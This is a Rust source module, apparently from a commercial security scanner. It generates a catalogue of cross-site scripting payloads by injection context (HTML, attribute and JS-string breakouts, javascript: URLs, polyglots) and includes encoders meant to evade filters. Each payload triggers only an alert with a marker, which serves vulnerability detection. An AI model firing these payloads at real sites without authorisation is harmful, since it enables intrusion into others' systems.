// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

//! XSS Payload generation and management

use serde::{Deserialize, Serialize};

/// XSS Payload with metadata
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XssPayload {
    /// The actual payload string
    pub payload: String,
    /// Payload category
    pub category: PayloadCategory,
    /// Context where this payload works
    pub context: PayloadContext,
    /// Encoding type
    pub encoding: PayloadEncoding,
    /// Whether this requires JavaScript execution to detect
    pub requires_js: bool,
    /// Expected trigger function
    pub trigger_function: String,
    /// Description of what this payload does
    pub description: String,
}

/// Payload categories
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PayloadCategory {
    /// Basic script tag injection
    ScriptTag,
    /// Event handler based
    EventHandler,
    /// SVG based
    Svg,
    /// IMG tag based
    ImgTag,
    /// Iframe based
    Iframe,
    /// Object/Embed based
    ObjectEmbed,
    /// URL based (javascript:)
    UrlBased,
    /// CSS based (expression, etc.)
    CssBased,
    /// Template injection
    Template,
    /// DOM based
    DomBased,
    /// Polyglot
    Polyglot,
}

/// Context where payload is injected
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PayloadContext {
    /// Inside HTML tag content
    HtmlContent,
    /// Inside HTML attribute value (double quoted)
    AttributeDouble,
    /// Inside HTML attribute value (single quoted)
    AttributeSingle,
    /// Inside HTML attribute value (unquoted)
    AttributeUnquoted,
    /// Inside JavaScript string (double quoted)
    JsStringDouble,
    /// Inside JavaScript string (single quoted)
    JsStringSingle,
    /// Inside JavaScript template literal
    JsTemplateLiteral,
    /// Inside JavaScript code directly
    JsCode,
    /// Inside CSS
    Css,
    /// Inside URL
    Url,
    /// Inside JSON
    Json,
    /// Universal (works in multiple contexts)
    Universal,
}

/// Encoding type for payload
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PayloadEncoding {
    /// No encoding
    None,
    /// URL encoding
    Url,
    /// HTML entity encoding
    HtmlEntity,
    /// Unicode encoding
    Unicode,
    /// Base64 encoding
    Base64,
    /// Hex encoding
    Hex,
    /// Mixed encoding
    Mixed,
}

/// Payload generator
pub struct PayloadGenerator {
    /// Custom marker for detection
    marker: String,
}

impl Default for PayloadGenerator {
    fn default() -> Self {
        Self::new()
    }
}

impl PayloadGenerator {
    /// Create a new payload generator
    pub fn new() -> Self {
        Self {
            marker: "KALAMARI_XSS".to_string(),
        }
    }

    /// Create with custom marker
    pub fn with_marker(marker: impl Into<String>) -> Self {
        Self {
            marker: marker.into(),
        }
    }

    /// Get the marker
    pub fn marker(&self) -> &str {
        &self.marker
    }

    /// Generate basic payloads for HTML context
    pub fn html_payloads(&self) -> Vec<XssPayload> {
        vec![
            XssPayload {
                payload: format!("<script>alert('{}')</script>", self.marker),
                category: PayloadCategory::ScriptTag,
                context: PayloadContext::HtmlContent,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Basic script tag injection".to_string(),
            },
            XssPayload {
                payload: format!("<img src=x onerror=alert('{}')>", self.marker),
                category: PayloadCategory::ImgTag,
                context: PayloadContext::HtmlContent,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "IMG tag onerror handler".to_string(),
            },
            XssPayload {
                payload: format!("<svg onload=alert('{}')>", self.marker),
                category: PayloadCategory::Svg,
                context: PayloadContext::HtmlContent,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "SVG onload handler".to_string(),
            },
            XssPayload {
                payload: format!("<body onload=alert('{}')>", self.marker),
                category: PayloadCategory::EventHandler,
                context: PayloadContext::HtmlContent,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Body onload handler".to_string(),
            },
            XssPayload {
                payload: format!("<iframe src=\"javascript:alert('{}')\">", self.marker),
                category: PayloadCategory::Iframe,
                context: PayloadContext::HtmlContent,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Iframe with javascript URL".to_string(),
            },
            XssPayload {
                payload: format!("<details open ontoggle=alert('{}')>", self.marker),
                category: PayloadCategory::EventHandler,
                context: PayloadContext::HtmlContent,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Details tag ontoggle handler".to_string(),
            },
            XssPayload {
                payload: format!("<marquee onstart=alert('{}')>", self.marker),
                category: PayloadCategory::EventHandler,
                context: PayloadContext::HtmlContent,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Marquee onstart handler".to_string(),
            },
            XssPayload {
                payload: format!("<video src=x onerror=alert('{}')>", self.marker),
                category: PayloadCategory::EventHandler,
                context: PayloadContext::HtmlContent,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Video tag onerror handler".to_string(),
            },
            XssPayload {
                payload: format!("<audio src=x onerror=alert('{}')>", self.marker),
                category: PayloadCategory::EventHandler,
                context: PayloadContext::HtmlContent,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Audio tag onerror handler".to_string(),
            },
            XssPayload {
                payload: format!("<input onfocus=alert('{}') autofocus>", self.marker),
                category: PayloadCategory::EventHandler,
                context: PayloadContext::HtmlContent,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Input autofocus with onfocus".to_string(),
            },
        ]
    }

    /// Generate payloads for attribute context (double quote escape)
    pub fn attribute_double_payloads(&self) -> Vec<XssPayload> {
        vec![
            XssPayload {
                payload: format!("\" onmouseover=\"alert('{}')\" x=\"", self.marker),
                category: PayloadCategory::EventHandler,
                context: PayloadContext::AttributeDouble,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Break out of double-quoted attribute".to_string(),
            },
            XssPayload {
                payload: format!("\"><script>alert('{}')</script>", self.marker),
                category: PayloadCategory::ScriptTag,
                context: PayloadContext::AttributeDouble,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Break attribute and inject script".to_string(),
            },
            XssPayload {
                payload: format!("\"><img src=x onerror=alert('{}')>", self.marker),
                category: PayloadCategory::ImgTag,
                context: PayloadContext::AttributeDouble,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Break attribute and inject img".to_string(),
            },
        ]
    }

    /// Generate payloads for attribute context (single quote escape)
    pub fn attribute_single_payloads(&self) -> Vec<XssPayload> {
        vec![
            XssPayload {
                payload: format!("' onmouseover='alert(\"{}\")' x='", self.marker),
                category: PayloadCategory::EventHandler,
                context: PayloadContext::AttributeSingle,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Break out of single-quoted attribute".to_string(),
            },
            XssPayload {
                payload: format!("'><script>alert('{}')</script>", self.marker),
                category: PayloadCategory::ScriptTag,
                context: PayloadContext::AttributeSingle,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Break single-quoted attribute and inject script".to_string(),
            },
        ]
    }

    /// Generate payloads for JavaScript string context
    pub fn js_string_payloads(&self) -> Vec<XssPayload> {
        vec![
            XssPayload {
                payload: format!("';alert('{}');//", self.marker),
                category: PayloadCategory::DomBased,
                context: PayloadContext::JsStringSingle,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Break JS single-quoted string".to_string(),
            },
            XssPayload {
                payload: format!("\";alert('{}');//", self.marker),
                category: PayloadCategory::DomBased,
                context: PayloadContext::JsStringDouble,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Break JS double-quoted string".to_string(),
            },
            XssPayload {
                payload: format!("`;alert('{}');//", self.marker),
                category: PayloadCategory::DomBased,
                context: PayloadContext::JsTemplateLiteral,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Break JS template literal".to_string(),
            },
            XssPayload {
                payload: format!("${{alert('{}')}}", self.marker),
                category: PayloadCategory::Template,
                context: PayloadContext::JsTemplateLiteral,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Template literal injection".to_string(),
            },
        ]
    }

    /// Generate URL-based payloads
    pub fn url_payloads(&self) -> Vec<XssPayload> {
        vec![
            XssPayload {
                payload: format!("javascript:alert('{}')", self.marker),
                category: PayloadCategory::UrlBased,
                context: PayloadContext::Url,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "javascript: URL scheme".to_string(),
            },
            XssPayload {
                payload: format!(
                    "data:text/html,<script>alert('{}')</script>",
                    self.marker
                ),
                category: PayloadCategory::UrlBased,
                context: PayloadContext::Url,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "data: URL with HTML".to_string(),
            },
        ]
    }

    /// Generate polyglot payloads (work in multiple contexts)
    pub fn polyglot_payloads(&self) -> Vec<XssPayload> {
        vec![
            XssPayload {
                payload: format!(
                    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert('{}') )//",
                    self.marker
                ),
                category: PayloadCategory::Polyglot,
                context: PayloadContext::Universal,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Multi-context polyglot".to_string(),
            },
            XssPayload {
                payload: format!(
                    "'\"-->]]>*/</script><script>alert('{}')</script>",
                    self.marker
                ),
                category: PayloadCategory::Polyglot,
                context: PayloadContext::Universal,
                encoding: PayloadEncoding::None,
                requires_js: true,
                trigger_function: "alert".to_string(),
                description: "Script escape polyglot".to_string(),
            },
        ]
    }

    /// Generate encoded variants of a payload
    pub fn encode_payload(&self, payload: &str, encoding: PayloadEncoding) -> String {
        match encoding {
            PayloadEncoding::None => payload.to_string(),
            PayloadEncoding::Url => {
                payload
                    .chars()
                    .map(|c| {
                        if c.is_ascii_alphanumeric() {
                            c.to_string()
                        } else {
                            format!("%{:02X}", c as u8)
                        }
                    })
                    .collect()
            }
            PayloadEncoding::HtmlEntity => {
                payload
                    .chars()
                    .map(|c| format!("&#{};", c as u32))
                    .collect()
            }
            PayloadEncoding::Unicode => {
                payload
                    .chars()
                    .map(|c| format!("\\u{:04X}", c as u32))
                    .collect()
            }
            PayloadEncoding::Hex => {
                payload
                    .chars()
                    .map(|c| format!("\\x{:02X}", c as u8))
                    .collect()
            }
            PayloadEncoding::Base64 => {
                use base64::Engine;
                base64::engine::general_purpose::STANDARD.encode(payload)
            }
            PayloadEncoding::Mixed => {
                // Mix different encodings
                payload
                    .chars()
                    .enumerate()
                    .map(|(i, c)| {
                        match i % 3 {
                            0 => format!("&#{};", c as u32),    // HTML entity
                            1 => format!("%{:02X}", c as u8),   // URL encode
                            _ => c.to_string(),                 // Plain
                        }
                    })
                    .collect()
            }
        }
    }

    /// Get all payloads
    pub fn all_payloads(&self) -> Vec<XssPayload> {
        let mut payloads = Vec::new();
        payloads.extend(self.html_payloads());
        payloads.extend(self.attribute_double_payloads());
        payloads.extend(self.attribute_single_payloads());
        payloads.extend(self.js_string_payloads());
        payloads.extend(self.url_payloads());
        payloads.extend(self.polyglot_payloads());
        payloads
    }

    /// Get payloads for a specific context
    pub fn payloads_for_context(&self, context: PayloadContext) -> Vec<XssPayload> {
        self.all_payloads()
            .into_iter()
            .filter(|p| p.context == context || p.context == PayloadContext::Universal)
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_generation() {
        let gen = PayloadGenerator::new();
        let payloads = gen.all_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_encoding() {
        let gen = PayloadGenerator::new();
        let encoded = gen.encode_payload("<script>", PayloadEncoding::HtmlEntity);
        assert!(encoded.contains("&#"));
    }

    #[test]
    fn test_context_filtering() {
        let gen = PayloadGenerator::new();
        let payloads = gen.payloads_for_context(PayloadContext::HtmlContent);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p|
            p.context == PayloadContext::HtmlContent ||
            p.context == PayloadContext::Universal
        ));
    }
}
